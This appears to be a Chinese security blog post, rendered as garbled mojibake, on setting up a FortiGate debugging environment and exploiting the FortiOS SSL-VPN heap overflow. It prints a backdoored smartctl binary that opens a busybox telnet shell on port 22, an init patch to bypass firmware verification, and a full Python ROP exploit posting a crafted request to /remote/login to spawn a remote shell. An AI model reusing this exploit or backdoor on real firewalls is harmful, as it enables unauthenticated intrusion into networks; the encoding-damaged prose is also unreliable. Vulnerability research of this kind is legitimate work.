#  ã€æ¼æ´ã€‘é£å¡”é˜²ç«å¢™æ¼æ´æ·±åº¦åˆ©ç”¨åŠè°ƒè¯•ç¯å¢ƒæ­å»º   
sn0w  ç¥å†œSec   2025-06-06 01:04  
  
æ‰«ç åŠ åœˆå­  
  
è·å†…éƒ¨èµ„æ–™  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
ç½‘ç»œå®‰å…¨é¢†åŸŸå„ç§èµ„æºï¼ŒEDUSRCè¯ä¹¦ç«™æŒ–æ˜ã€çº¢è“æ”»é˜²ã€æ¸—é€æµ‹è¯•ç­‰ä¼˜è´¨æ–‡ç« ï¼Œä»¥åŠå·¥å…·åˆ†äº«ã€å‰æ²¿ä¿¡æ¯åˆ†äº«ã€POCã€EXPåˆ†äº«ã€‚  
ä¸å®šæœŸåˆ†äº«å„ç§å¥½ç©çš„é¡¹ç›®åŠå¥½ç”¨çš„å·¥å…·ï¼Œæ¬¢è¿å…³æ³¨ã€‚åŠ å†…éƒ¨åœˆå­ï¼Œæ–‡æœ«æœ‰å½©è›‹ï¼ˆçŸ¥è¯†æ˜Ÿçƒä¼˜æƒ å·ï¼‰ã€‚  
#   
  
æ–‡ç« ä½œè€…ï¼šsn0w  
  
æ–‡ç« æ¥æºï¼šhttps://xz.aliyun.com/news/18116  
  
  
  
**é£å¡”é˜²ç«å¢™æ¼æ´æ·±åº¦åˆ©ç”¨åŠè°ƒè¯•ç¯å¢ƒæ­å»º**  
  
  
###   
## ç¯å¢ƒæ­å»º  
  
  
é€šè¿‡å®˜æ–¹ä¸‹è½½é™„ä»¶ï¼Œå¯¼å…¥forigate-vm  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dffzgMKZMiabt924BcX6ncfV6F1dSlwsibTeepEmeWpOxfD0QK57CfT4wg/640?wx_fmt=png&from=appmsg "")  
  
### é£å¡”æ¿€æ´»  
  
  
å¯ä»¥å‚è€ƒä¸‹é¢å¸ˆå‚…ç»™å‡ºçš„è„šæœ¬è¿›è¡Œæ¿€æ´»  
  
  
rrrrrrri/fgt-gadgets: Fortigate related tools  
  
### ç½‘å¡ipé…ç½®ï¼š  
  
  
ç„¶åè®¾ç½®ç¬¬ä¸€ä¸ªç½‘å¡ä¸ºNatæ¨¡å¼  
  
```
config system interface
edit port1
set mode static
set ip 192.168.111.98 255.255.255.0
set allowaccess http https ping ssh telnet
end
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfAO8EW0njYmgMXYCBW9xTtRxt6pFv7JzphsGib2bMHd5nMO01gysARbg/640?wx_fmt=png&from=appmsg "")  
  
### é…ç½®ç½‘å¡  
  
```
config router static
edit 1
set device port1
set gateway 192.168.111.2
end
```  
  
é…ç½®å¥½ä¹‹åå°±å¯ä»¥è®¿é—®äº†  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfBWAPKIRJRPfSo1lIPhSt62HFc5CuvKhWYSozC04QaMlhWxFIQJMXicg/640?wx_fmt=png&from=appmsg "")  
  
### é…ç½® sslvpn  
  
  
æˆ‘ä»¬éœ€è¦å¼€å¯sslvpnçš„åŠŸèƒ½ï¼Œéœ€è¦å¯¹é˜²ç«å¢™è¿›è¡Œä»¥ä¸‹é…ç½®  
  
  
SSLVPN_address Â  subnet_addres Â ubuntu22  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfF13iaTuM8oIY5KtdMHBb4BYgLj1dB2yLiaeqFhibS4hYXUT1Z3Wopia5Aw/640?wx_fmt=png&from=appmsg "")  
  
  
å†åˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfALuPh0y2zY6vbKg9bHHPMjT2aTLIkg7GUbsaEMhvDw0LNpQFCuy7kQ/640?wx_fmt=png&from=appmsg "")  
  
  
ä¿®æ”¹ vpn é—¨æˆ·ï¼Œå¹¶è¿›å…¥ full-access ä¿®æ”¹ç•Œé¢ Â VPN â€”â€“> SSL-VPN-Portalsâ€”-> full-access  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfdTNQ3aQBZA1VXzOJDKpwgibfhUg6Ubb2wUzKr5OL6MbVYH67apOGGZg/640?wx_fmt=png&from=appmsg "")  
  
  
è¿›å…¥vpnä¸­ä¿®æ”¹è®¾ç½®å¦‚ä¸‹ï¼š  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dftlgRpCjicm2wpGyegnUZQwbqV5AXBJ2fYHRTKI7DHsUH5pL5icfYnWxQ/640?wx_fmt=png&from=appmsg "")  
  
  
æ¥ç€ä¿®æ”¹é˜²ç«å¢™é…ç½®ç­–ç•¥  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfmBwJIUZvDmibVjlsB1WgPIw8VSCXFiat9U54vEyzMWga0ricMvZdca0kA/640?wx_fmt=png&from=appmsg "")  
  
  
ç„¶åå°±å¯ä»¥è®¿é—®4433ç«¯å£  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfAIt1lMG0OwiaodexaKvmop62I6Y6gjnY66k4BQeqp3g3ZdF71CNiaAqg/640?wx_fmt=png&from=appmsg "")  
  
### è°ƒè¯•ç¯å¢ƒæ­å»º gdbserver+gdb  
  
#### æå–å›ºä»¶  
  
  
1ã€å®‰è£…libguestfs  
libguestfs æ˜¯ä¸€ç»„ Linux ä¸‹çš„ C è¯­è¨€çš„ API ï¼Œç”¨æ¥è®¿é—®è™šæ‹Ÿæœºçš„ç£ç›˜æ˜ åƒæ–‡ä»¶ï¼Œå‡ ä¹å¯è®¿é—®ä»»æ„ç±»å‹çš„æ–‡ä»¶ç³»ç»Ÿã€‚  
  
```
sudo apt install libguestfs-tools
```  
  
2ã€æŸ¥çœ‹ç£ç›˜åˆ†åŒºæƒ…å†µ  
  
```
sudo virt-filesystems -a fortigate7.2.2-disk1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfHqJbsKsCDMFTTtg0khbhWKM5BIIMZHftF4Fy504YV72zHH0HEfIFPQ/640?wx_fmt=png&from=appmsg "")  
  
  
3ã€æŒ‚è½½  
  
```
sudo guestmount -a fortigate_7.2.2-disk1.vmdk -m /dev/sda1 --ro fortios_mount
```  
  
è¿™é‡Œè¸©é›·äº† ä¸å»ºè®®ç”¨è¿™ç§æ–¹å¼æŒ‚è½½ å»ºè®®åœ¨vmwareä¸Šè¿›è¡ŒæŒ‚è½½ Â ç”¨ä¸Šé¢è¿™ç§æ–¹å¼å¯èƒ½å¯¼è‡´ä½ è¦†ç›–æ–‡ä»¶çš„æ—¶å€™è¦†ç›–çš„æ˜¯ç¼“å­˜  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfQdRZ1SjWAeLTx1uyhrcAbRCW9bg8kjLhpWlPgibdiaVcODKh4jFGwZDQ/640?wx_fmt=png&from=appmsg "")  
  
  
4ã€æŒ‚è½½æˆåŠŸåï¼Œrootfs.gzä¸ºæ–‡ä»¶ç³»ç»Ÿå‹ç¼©åŒ…ï¼Œæˆ‘ä»¬å°†å…¶å¤åˆ¶å‡ºæ¥  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfg8xujDAGQOxicsvKj4PZAg0lZxRXobTBAMSIlnNnjKsoMTW1QFYy9PQ/640?wx_fmt=png&from=appmsg "")  
  
  
å¤åˆ¶å‡ºæ¥åèµ‹æƒè§£å‹  
  
```
sudo cp roofts.gz ../fritios
cd ..
chmod 777 rootfs.gz
gzip -d rootfs.gz
sudo cpio -idmv < ./rootfs
sudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xz
sudo chroot . /sbin/ftar -xf /bin.tar
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfQicMMzK8unJ6Pa8xCh9lB8kH5fndaVMq86icY3r7X3f8kSfH0MsxI77A/640?wx_fmt=png&from=appmsg "")  
  
#### gdb  
  
  
å‡†å¤‡ä¸€ä¸ªbusybox æä¾›å®Œæˆçš„shæŒ‡ä»¤ï¼Œfgtè‡ªå¸¦çš„shç¼ºå°‘å¾ˆå¤šæŒ‡ä»¤  
  
  
è¿™é‡Œå®¹æ˜“ç¼–è¯‘å¤±è´¥ å»ºè®®å¤šæ¢å‡ ä¸ªç‰ˆæœ¬è¯•è¯•  
  
  
é…ç½®busybox  
  
```
wget Â https://git.busybox.net/busybox/snapshot/busybox-1_36_1.tar.bz2
tar -xjvf busybox-1_36_1.tar.bz2
sudo apt-get install libncurses5-devÂ 
make menuconfig

make -j6
```  
  
å¼€å§‹ç¼–è¯‘é‡åˆ°çš„æŠ¥é”™æ˜¯è¿™æ ·  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8df77ibP2GpJtEWJMrMzzxaSYjjvFiaWj0TGaonLYJeKBsf4yS9j0huXzeA/640?wx_fmt=png&from=appmsg "")  
  
  
æŸ¥äº†ä¸‹æ˜¯tcè¿™éƒ¨åˆ†çš„é—®é¢˜ ä½†å¥‡æ€ªçš„æ˜¯æˆ‘æœ‰å¯¼å…¥å¤´æ–‡ä»¶ äºæ˜¯æˆ‘å°±æŠŠè¿™éƒ¨åˆ†ç”¨make menuconfigä¸­å»æ‰äº† Â Networking Utilities ä¸­tc ç„¶ååœ¨ç¼–è¯‘  
  
```
sudo cp ../busybox ./bin
sudo chmod +x ./bin/busybox

cd bin
sudo rm -rf sh
ln -s /bin/busybox sh
mv sh ./bin/sh
```  
  
é…ç½®gdbserver  
  
```
sudo cp ../gdbserver-7.10.1-x64 ./bin
sudo chmod +x ./bin/gdbserver-7.10.1-x64
```  
  
åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡ŒÂ diagnose hardware smartctl  
Â ç³»ç»Ÿä¼šæ‰§è¡Œ /bin/smartctl ç¨‹åºï¼›  
å¯ä»¥è‡ªå·±é‡æ–°å†™ä¸ªsmartctlæ”¾è¿›å»ã€å¤ç”¨22ç«¯å£ä¸ºsh  
  
```
#include<stdio.h>
void shell(){
Â  Â  system("/bin/busybox ls",0,0);	//æ‰§è¡Œls
Â  Â  system("/bin/busybox id",0,0);	//æ‰§è¡Œid
Â  Â  system("/bin/busybox kill all sshd && /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22",0,0);		//åœæ­¢æ‰€æœ‰sshdè¿›ç¨‹ï¼ŒtelnetæŒ‚è½½shåˆ°22ç«¯å£ã€æ­¤æ—¶shæ˜¯æŒ‡busybox
Â  Â  return;
}

int main(int argc, char const *argv[]){
Â  Â  shell();
Â  Â  return 0;
}
```  
  
gccç¼–è¯‘å æ”¾å…¥binä¸­  
  
```
gcc smartctl.c -static -o smartctl
sudo cp ../smartctl ./bin
sudo chmod +x ./bin/smartctl
```  
  
åç¼–è¯‘å†…æ ¸æ–‡ä»¶flatkc  
  
```
void __fastcall __noreturn init_post_isra_0(__int64 a1, void **a2)
{
Â  char v2; // al
Â  __int64 v3; // rax
Â  int v4; // edx
Â  int v5; // ecx
Â  int v6; // r8d
Â  int v7; // r9d
Â  char v8; // [rsp-8h] [rbp-8h]

Â  v8 = v2;
Â  async_synchronize_full(a1, a2);
Â  free_initmem();
Â  dword_FFFFFFFF80A19880 = 1;
Â  numa_default_policy();
Â  v3 = *(_QWORD *)(__readgsqword(0xB700u) + 1048);
Â  *(_DWORD *)(v3 + 92) |= 0x40u;
Â  if ( !(unsigned int)fgt_verify() )//æ ¡éªŒå‡½æ•°
Â  {
Â  Â  off_FFFFFFFF809B82C0 = "/sbin/init";
Â  Â  a2 = &off_FFFFFFFF809B82C0;
Â  Â  kernel_execve("/sbin/init", &off_FFFFFFFF809B82C0, off_FFFFFFFF809B81A0);
Â  }
Â  panic(
Â  Â  (unsigned int)"No init found. Â Try passing init= option to kernel. See Linux Documentation/init.txt for guidance.",
Â  Â  (_DWORD)a2,
Â  Â  v4,
Â  Â  v5,
Â  Â  v6,
Â  Â  v7,
Â  Â  v8);
}

```  
  
åœ¨ä»£ç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯åŠ¨çš„æ˜¯initæ–‡ä»¶ å› æ­¤æˆ‘ä»¬å¯ä»¥patch initæ–‡ä»¶  
  
  
æˆ‘ä»¬æŠŠ/bin/initçš„æ–‡ä»¶è¿™éƒ¨åˆ†patch åªè¦æ¶‰åŠåˆ°do_haltå‡½æ•° callçš„å…¨éƒ¨patchæ‰  
  
  
æ‰€æœ‰è¿™äº›åšå®Œå å°±å¯ä»¥é‡æ‰“åŒ…äº†  
  
```
#å‹ç¼©/binæ–‡ä»¶
sudo chroot . /sbin/ftar -cf bin.tar bin
sudo chroot . /sbin/xz --check=sha256 -e bin.tar
#è¿™é‡Œè®°å¾—æŠŠ/binæ–‡ä»¶ç§»å‡ºå½“å‰ç›®å½•
sudo find ./ | cpio -H newc -o > ../rootfs.raw
cd ../
sudo cat ./rootfs.raw | gzip > rootfs.gz
# è¿›å…¥ç¡¬ç›˜ç›®å½•
sudo rm ./rootfs.gz
sudo cp ~/Desktop/rootfs.gz ./
```  
  
ç„¶åææƒ æŠŠroofts.gzè¦†ç›–åŸæ¥çš„å°±å¯ä»¥äº†  
  
  
æ¥ä¸‹æ¥ æˆ‘ä»¬æŠŠflatkc æå–å‡ºæ¥ è¿™æ˜¯å†…æ ¸æ–‡ä»¶ æˆ‘ä»¬æŠŠå†…æ ¸è½¬åŒ–ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶ è¿›è¡Œåˆ†æ å’Œ è°ƒè¯•  
  
```
sudo apt install python3-pip liblzo2-dev
sudo pip3 install --upgrade lz4 zstandard git+https://github.com/clubby789/python-lzo@b4e39df
sudo pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf
```  
  
è¸©çš„å‘ æˆ‘å¼€å§‹å®‰è£…çš„æ—¶å€™ å‡ºç°äº†è¿™ä¸ªæŠ¥é”™Â   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfNNq4zF9odDZKXGFcJMGoyibxtDKj5EzISWxhJ1ibHicqx4BicsrIxky9rg/640?wx_fmt=png&from=appmsg "")  
  
  
æˆ‘çš„è§£å†³åŠæ³•æ˜¯ æ‰‹åŠ¨å®‰è£…  
  
  
ä½ å¯ä»¥æ‰‹åŠ¨å…‹éš†Â python-lzo  
Â åº“åˆ°æœ¬åœ°ï¼Œç„¶åå†è¿›è¡Œå®‰è£…ï¼š  
  
```
bashgit clone https://github.com/clubby789/python-lzo
cd python-lzo
git checkout b4e39df
sudo pip3 install .
```  
  
ç„¶ååœ¨æ‰§è¡Œåé¢çš„å°±æ²¡é—®é¢˜äº†  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfakLvjvbsYb1ibibnI6lO3TKTv57Zm0LlZdc9QJcvu7y585ibMibGymC7wg/640?wx_fmt=png&from=appmsg "")  
  
  
ç„¶åå°±å¯ä»¥å¯åŠ¨é£å¡”è¿›è¡Œè°ƒè¯•äº† å¯åŠ¨å é£å¡”å¦‚æœä¸€ç›´åœ¨é‡å¯çŠ¶æ€å°±è¯´æ˜æˆ‘ä»¬è¦†ç›–æˆåŠŸäº† Â è¿™æ˜¯å› ä¸ºé£å¡”ä¸€ç›´è¿‡ä¸äº†èº«ä»½éªŒè¯  
  
  
ä¹Ÿå°±æ˜¯è¿™ä¸ªä½ç½®  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8df28dvibHUsFiaOS37rhrwZcia9lS8zEeaqY2Jo09iaDXAVnDtWLKLTfhLicQ/640?wx_fmt=png&from=appmsg "")  
  
  
æˆ‘ä»¬å°±ç›´æ¥æ–­ç‚¹åˆ°è¿™ä¸ªä½ç½®ï¼š  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfhPOiaJibwQpibtMzNMjic2AS8kehxag9xAnNHrAZ61n6a92ZIBfqGELMww/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfxg9sp8OTRhWcRHw4xzic7bD3Sc9dwKjf7PFT22b2kwvFf3wibvVpSdSQ/640?wx_fmt=png&from=appmsg "")  
  
  
å‘ç°æ–­çš„ä¸æ˜¯æˆ‘ä»¬çš„æ–­ç‚¹ è¿™é‡Œçš„åŸå› æš‚ä¸æ¸…æ¥š ä½†æ˜¯è§£å†³åŠæ³•å°±æ˜¯ï¼Œæ— è®ºå¦‚ä½•åˆ«æŒ‰é‚£ä¸ªç»¿è‰²ç®­å¤´ï¼Œä½ åªéœ€è¦ç†è§£ ä½ ä¸€ç›´c å®ƒæ˜¯ä¼šä¸€ç›´é‡å¯çš„ å®ƒé‡å¯å°±ä¼šåå¤æ‰§è¡Œstart_kernelè¿™ä¸ªæµç¨‹ï¼Œé‚£ä¹ˆ ä½ å¯ä»¥å°è¯•å…ˆå¾€æœ€å¼€å§‹çš„ç‚¹ æ–­ ç„¶åä¸€ç‚¹ä¸€ç‚¹çš„æ¥è¿‘ä½ è¦æ–­çš„ç‚¹  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfTl4zKQHQ40DzIViaOb1ghTbt9MED49FD5Bpb53kQ5FdCtex8DrlT1fg/640?wx_fmt=png&from=appmsg "")  
  
  
å…ˆæ–­åœ¨è¿™é‡Œ å†æ–­åœ¨æˆ‘ä»¬å¼€å§‹è¦æ–­çš„ä½ç½®å°±å¯ä»¥äº†  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfts5D8G7MYMnS0SJ5gUa9rc6BvicsibU7Dbub3mmVRz39UUke4k9gbGZA/640?wx_fmt=png&from=appmsg "")  
  
  
è¿‡äº†è¿™é‡Œ ni ç„¶å set $rax=0 å†cå°±å¯ä»¥è¿›å»äº†  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dflg4VVv9OG8ToicrfNHnibNTTengXkhMWgzXzmicBaLU9XaxMG2ichlrN9w/640?wx_fmt=png&from=appmsg "")  
  
  
ç„¶åæµ‹è¯•ä¸€ä¸‹åé—¨  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfvY1pRYa5yba0NZEDhmh6O0b8UM86CMTZfrZFXvsDf0LAQHhgpfkweQ/640?wx_fmt=png&from=appmsg "")  
  
  
æˆåŠŸæ‹¿åˆ°shell  
  
## æ¼æ´æ·±åº¦åˆ©ç”¨  
  
  
A heap-based buffer overflow vulnerability [CWE-122] in FortiOS SSL-VPN 7.2.0 through 7.2.2, 7.0.0 through 7.0.8, 6.4.0 through 6.4.10, 6.2.0 through 6.2.11, 6.0.15 and earlier and FortiProxy SSL-VPN 7.2.0 through 7.2.1, 7.0.7 and earlier may allow a remote unauthenticated attacker to execute arbitrary code or commands via specifically crafted requests.  
  
  
åœ¨ FortiOS SSL-VPN 7.2.0 è‡³ 7.2.2ã€7.0.0 è‡³ 7.0.8ã€6.4.0 è‡³ 6.4.10ã€6.2.0 è‡³ 6.2.11ã€6.0.15 åŠæ›´æ—©ç‰ˆæœ¬ï¼Œä»¥åŠ FortiProxy SSL-VPN 7.2.0 è‡³ 7.2.1ã€7.0.7 åŠæ›´æ—©ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªåŸºäºå †çš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ [CWE-122]ã€‚è¯¥æ¼æ´å¯èƒ½å…è®¸è¿œç¨‹æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…é€šè¿‡ç‰¹åˆ¶çš„è¯·æ±‚æ‰§è¡Œä»»æ„ä»£ç æˆ–å‘½ä»¤ã€‚  
  
### å¸¦shç¯å¢ƒä¸‹çš„æ”»å‡»  
  
```
import socket
import ssl
from pwn import *
import random
import os
import sys
import time
from pwn import *
from ctypes import *
path = "/remote/login".encode()
content_length = ["115964116992"]
ip = "192.168.111.148"
#1376
#0x000000000257008a push rdx.pop rdi.ret
#0x00000000017ec3b7 : add rdx, 0x28 ; cmp eax, 7 ; jne 0x17ec3b0 ; ret
#0x000000000060e7e9 : pop rax ; pop rsi ; ret
#0x000000000065e899 : pop rax ; sti ; ret
#0x00000000012ce87f : std ; pop rdx ; ret
#0x0000000000530c8e : pop rsi ; ret
#0x000000000046bb27 : pop rax ; ret
#0x0000000000509372 : pop rdx ; ret

ROP=struct.pack('q',0x000000000060e7e9)
ROP+=struct.pack('q',0x7)
ROP+=struct.pack('q',0x7)

ROP+=struct.pack('q',0x00000000017ec3b7)
ROP+=struct.pack('q',0x00000000017ec3b7)
ROP+=struct.pack('q',0x00000000017ec3b7)
ROP+=struct.pack('q',0x000000000257008a)
ROP+=struct.pack('q',0x000000000046bb27)
ROP+=struct.pack('q',0x58)
ROP+=struct.pack('q',0x0000000000509372)
ROP+=struct.pack('q',0)
ROP+=struct.pack('q',0x0000000000530c8e)
ROP+=struct.pack('q',0)
ROP+=struct.pack('q',0x000000000257008c)
ROP+=struct.pack('q',0x00000000043EC10)
ROP+=b'a'*8+b"/bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22"+b"\x00"*8
print(hex(len(ROP)))

payload=b'a'*0x560+ROP
payload=payload.ljust(0x620,b'a')+struct.pack('q', 0x0000000000febbaa)
for CL in content_length:
Â  Â  try:
Â  Â  Â  Â  data = b"POST " + path + b" HTTP/1.1\r\nHost: " + \
Â  Â  Â  Â  Â  Â  ip.encode() + b"\r\nContent-Length: " + CL.encode() + \
Â  Â  Â  Â  Â  Â  b"\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n"+payload

Â  Â  Â  Â  _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
Â  Â  Â  Â  _socket.connect((ip, 4433))
Â  Â  Â  Â  _default_context = ssl._create_unverified_context()
Â  Â  Â  Â  _socket = _default_context.wrap_socket(_socket)
Â  Â  Â  Â  _socket.sendall(data)
Â  Â  Â  Â  res = _socket.recv(1024)
Â  Â  Â  Â  print(res)
Â  Â  Â  Â  if b"HTTP/1.1" not in res:
Â  Â  Â  Â  Â  Â  print("Error detected")
Â  Â  Â  Â  Â  Â  print(CL)
Â  Â  Â  Â  Â  Â  break
Â  Â  except Exception as e:
Â  Â  Â  Â  print(e)
Â  Â  Â  Â  print("Error detected")
Â  Â  Â  Â  print(CL)
Â  Â  Â  Â  break

```  
### realç¯å¢ƒä¸‹çš„æ”»å‡»  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8df25og61H6lF9MSIFtULR55coDWEGnibLlXWeT862J5fjRZEwjggJaDjQ/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™é‡Œå°±ä¸å¾—ä¸æä¸€å˜´ systemå’Œexecç³»åˆ—å‡½æ•°å‘½ä»¤æ‰§è¡Œçš„åŒºåˆ«äº†ï¼š  
  
  
1ã€system()å’Œexec()éƒ½å¯ä»¥æ‰§è¡Œè¿›ç¨‹å¤–çš„å‘½ä»¤ï¼Œsystemæ˜¯åœ¨åŸè¿›ç¨‹ä¸Šå¼€è¾Ÿäº†ä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œä½†æ˜¯execæ˜¯ç”¨æ–°è¿›ç¨‹(å‘½ä»¤)è¦†ç›–äº†åŸæœ‰çš„è¿›ç¨‹ã€‚  
2ã€system()å’Œexec()éƒ½æœ‰èƒ½äº§ç”Ÿè¿”å›å€¼ï¼Œsystemçš„è¿”å›å€¼å¹¶ä¸å½±å“åŸæœ‰è¿›ç¨‹ï¼Œä½†æ˜¯execçš„è¿”å›å€¼å½±å“äº†åŸè¿›ç¨‹ã€‚  
3ã€systeméœ€è¦å…ˆå¯åŠ¨ä¸€ä¸ªshellæ‰èƒ½è¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ï¼Œè°ƒç”¨systemå‡½æ•°æ‰§è¡ŒæŒ‡å®šå‘½ä»¤æ—¶ï¼ŒåŸè¿›ç¨‹ä¼šæš‚åœç­‰å¾…ï¼Œä¹‹åå†ç»§ç»­è¿›è¡Œï¼›è°ƒç”¨execå‡½æ•°å¼€å¯æ–°è¿›ç¨‹åï¼ŒåŸè¿›ç¨‹å°†è¢«ç›´æ¥å…³é—­ã€‚  
  
  
é‚£è¿™é‡Œæ²¡æœ‰/bin/sh é‚£æˆ‘ä»¬å‘½ä»¤æ‰§è¡Œå¯ä»¥æ”»å‡»çš„æ€è·¯æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšå‘¢ï¼Ÿ  
  
  
1.æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘½ä»¤æ‰§è¡Œä¸‹è½½ç¼–è¯‘å¥½çš„busybox æ¥è¾¾åˆ°è¢«é˜‰å‰²çš„shellç°çŠ¶  
  
  
2.æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ropä¸Šä¼ æˆ‘ä»¬è¦æ‰§è¡Œçš„æ–‡ä»¶  
  
  
è¿™é‡Œæ›´å¤šçš„æ˜¯æ¨èæ€è·¯1ï¼Œ å› ä¸ºæ–‡ä»¶ä¸Šä¼ å¦‚æœæ–‡ä»¶è¿‡å¤§çš„è¯ å®¹æ˜“å¯¼è‡´è¿æ¥å´©æºƒ  
  
```
#include <unistd.h>
int execl(const char *path, const char *arg, ...);
int execlp(const char *file, const char *arg, ...);
int execle(const char *path, const char *arg, ..., char *const envp[]);
int execv(const char *path, char *const argv[]);
int execvp(const char *file, char *const argv[]);
int execve(const char *path, char *const argv[], char *const envp[]);
```  
  
è¿™é‡Œå°±å¾—è€ƒè™‘æ„é€ ropï¼Œå› ä¸ºexecæœ‰ä¸¤ç§ç±»å‹ï¼Œä¸€ä¸ªæ˜¯æ•°ç»„ä¼ å‚ï¼Œå¦ä¸€ä¸ªæ˜¯å‚æ•°ä¼ å‚ï¼Œä½†æ˜¯ä»ä¸Šé¢çš„æ”»å‡»è¿‡ç¨‹ä¹Ÿå°±æ˜¯systemçš„æ”»å‡»è¿‡ç¨‹ï¼Œå…¶å®æˆ‘ä»¬æ˜¯å¯ä»¥å‘ç° gadgetæ˜¯æœ‰ç‚¹ä¸å¤Ÿçš„ï¼Œè¶Šæ‰“çš„åé¢è¶Šæ²¡æœ‰å¥½ç”¨çš„gadget ï¼Œå› ä¸ºä½ ä¸èƒ½ç ´åå‰é¢å¸ƒç½®å¥½çš„å‚æ•°ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥å†™å…¥çš„ropé“¾ä¹Ÿæ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œè¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒè¦å‘½çš„é—®é¢˜ï¼Œä½ è¦ä¸‹è½½busybox åˆ°æœ¬åœ° é‚£å°±å¾—ä¼ é€ip è€Œè¿™ä¸ªå­—ç¬¦ä¸²æ˜¯è‚¯å®šè¶…è¿‡äº†8å­—èŠ‚çš„ï¼Œè¿™å°±ä¼šå¯¼è‡´æˆ‘ä»¬æ„é€ å‚æ•°æ—¶ä¼šå¤šå‡ºä¸å¯æ§çš„å­—ç¬¦ä¸²ã€‚å¯¼è‡´å¦‚æœè€ƒè™‘ char åˆ—è¡¨æ¥è°ƒç”¨çš„è¯ rop chain ä¼šä¿®æ”¹çš„éå¸¸éº»çƒ¦ï¼ï¼ï¼(è¿™å°±æ˜¯æ•°ç»„ä¼ å‚çš„å¼Šç«¯)  
  
  
